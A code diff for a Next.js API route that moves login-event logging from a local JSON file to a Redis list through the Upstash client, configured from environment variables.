@@ -1,7 +1,10 @@
 import { NextResponse } from "next/server";
-import fs from "fs";
-import path from "path";
-import os from "os";
+import { Redis } from "@upstash/redis";
+
+const redis = new Redis({
+  url: process.env.KV_REST_API_URL,
+  token: process.env.KV_REST_API_TOKEN,
+});
 
 export async function POST(request) {
   try {
@@ -13,20 +16,8 @@ export async function POST(request) {
       date: new Date().toISOString(),
     };
 
-    // Use /tmp on Vercel (read-only filesystem), or project root locally
-    const isVercel = process.env.VERCEL === "1";
-    const filePath = isVercel
-      ? path.join(os.tmpdir(), "logins.json")
-      : path.join(process.cwd(), "logins.json");
-
-    let logins = [];
-    if (fs.existsSync(filePath)) {
-      const fileContent = fs.readFileSync(filePath, "utf-8");
-      logins = JSON.parse(fileContent);
-    }
-
-    logins.push(logEntry);
-    fs.writeFileSync(filePath, JSON.stringify(logins, null, 2), "utf-8");
+    // Push the login entry to a Redis list
+    await redis.rpush("logins", JSON.stringify(logEntry));
 
     return NextResponse.json({ success: true });
   } catch (error) {
